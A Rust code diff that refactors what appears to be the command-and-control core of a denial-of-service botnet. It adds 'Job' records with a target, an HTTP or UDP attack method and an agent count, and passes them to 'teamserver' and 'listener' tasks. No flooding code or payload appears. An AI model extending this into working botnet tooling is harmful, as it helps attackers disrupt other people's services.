@@ -5,7 +5,7 @@ use std::{fs, io::Read, sync::Arc};
 
 use toml;
 
-use serde::Deserialize;
+use serde::{Serialize, Deserialize};
 use serde_json::Value;
 
 use tokio::sync::Mutex;
@@ -18,14 +18,17 @@ struct ProfileConfig {
     users: Value 
 }
 
-enum AttackMethods { 
+#[derive(Serialize)]
+enum AttackMethod { 
     HTTP,
     UDP
 }
 
-struct Attack {
-    methods: AttackMethods,
-    name: String                // IP/Domain/URL etc 
+#[derive(Serialize)]
+struct Job {
+    target: String,
+    method: AttackMethod,
+    agents: isize,
 }
 
 // TODO: add commands like: list etc.
@@ -42,11 +45,11 @@ async fn main() -> Result<(), std::io::Error> {
 
     // Spawning tasks
 
-    let attacks: Arc<Mutex<Vec<Attack>>> = Arc::new(Mutex::new(Vec::new()));
+    let jobs: Arc<Mutex<Vec<Job>>> = Arc::new(Mutex::new(Vec::new()));
 
-    let attacks_clone = Arc::clone(&attacks);
-    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, config_parsed, attacks_clone).await } );
-    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, attacks).await } );
+    let jobs_clone = Arc::clone(&jobs);
+    let teamserver_task = tokio::task::spawn( async { teamserver::run(TEAMSERVER_ADDR, config_parsed, jobs_clone).await } );
+    let listener_task = tokio::task::spawn( async { listener::run(LISTENER_ADDR, jobs).await } );
 
     // Joining tasks
 
